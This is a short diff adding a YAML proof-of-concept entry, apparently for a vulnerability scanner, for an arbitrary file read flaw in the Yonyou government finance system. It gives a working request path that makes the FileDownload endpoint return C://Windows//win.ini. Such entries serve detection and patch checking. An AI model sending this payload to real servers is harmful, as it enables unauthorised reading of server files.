@@ -1,0 +1,3 @@
+name: "用友政务财务系统FileDownload存在任意文件读取漏洞"
+poc: "/bg/attach/FileDownload?execlPath=C://Windows//win.ini"
+status_code: 200
